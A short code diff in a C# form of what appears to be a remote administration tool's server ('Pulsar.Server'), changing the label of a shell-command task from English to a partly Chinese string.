@@ -43,7 +43,7 @@ namespace Pulsar.Server.Forms
             FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
             if (frm != null)
             {
-                frm.AddTask("Shell Command", host, CTextBox.Text);
+                frm.AddTask("Shell 命令", host, CTextBox.Text);
             }
         }
     }
